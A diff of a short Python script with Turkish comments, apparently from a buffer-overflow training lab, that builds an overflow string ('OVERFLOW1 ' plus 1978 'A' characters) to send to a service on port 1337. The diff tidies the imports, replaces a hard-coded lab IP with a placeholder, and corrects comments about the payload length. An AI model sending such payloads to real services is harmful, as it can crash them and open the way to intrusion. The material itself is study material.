@@ -1,19 +1,21 @@
 #!/usr/bin/env python3
 # Bu satır, Python betiğinin hangi ortamda çalıştırılacağını belirtir. Python 3 ile çalıştırılacak.
 
-import sys, time, socket
+import sys 
+import time 
+import socket
 # 'sys' modülü: Betik çalıştırıldığında sistem ile ilgili işlemleri yönetmek için kullanılır (örneğin, çıkış yapmak).
 # 'time' modülü: Bekleme ve zamanlama işlemleri için kullanılır.
 # 'socket' modülü: Ağ bağlantılarını kurmak ve veri transferi yapmak için kullanılır.
 
-ip = "192.168.37.131"  # Test edilecek hedefin IP adresi. Bu adresi değiştirmelisiniz.
+ip = "IP_ADDRESS"  # Test edilecek hedefin IP adresi. Bu adresi değiştirmelisiniz.
 port = 1337  # Bağlanılacak hizmetin port numarası. 1337 burada hedef hizmetin çalıştığı portu temsil ediyor. Bu portu da ihtiyacınıza göre değiştirmelisiniz.
 timeout = 5  # Bağlantı zaman aşımı süresi 5 saniye olarak ayarlanmış. Eğer hedef 5 saniye içinde yanıt vermezse bağlantı başarısız olacak.
 
 prefix = "OVERFLOW1 "  # Hedefe gönderilecek verinin başına eklenen özel bir ön ek. Genelde belirli bir komut veya formatı temsil eder. Bu, saldırıya veya teste özgü olabilir.
-string = prefix + "A"*1978  
-# Hedefe gönderilecek veri dizisi. Burada 1274 tane 'A' karakteri eklenmiş. 
-# 'prefix' ile başlıyor ve toplamda 1274 baytlık 'A' karakterleri içeriyor. Bu, muhtemelen buffer overflow testleri için kullanılıyor.
+string = prefix + "A" * 1978  
+# Hedefe gönderilecek veri dizisi. Burada 1978 tane 'A' karakteri eklenmiş. 
+# 'prefix' ile başlıyor ve toplamda 1978 baytlık 'A' karakterleri içeriyor. Bu, muhtemelen buffer overflow testleri için kullanılıyor.
 
 try:
     # Hata oluşmazsa çalıştırılacak kodlar bu blok içinde yer alıyor.
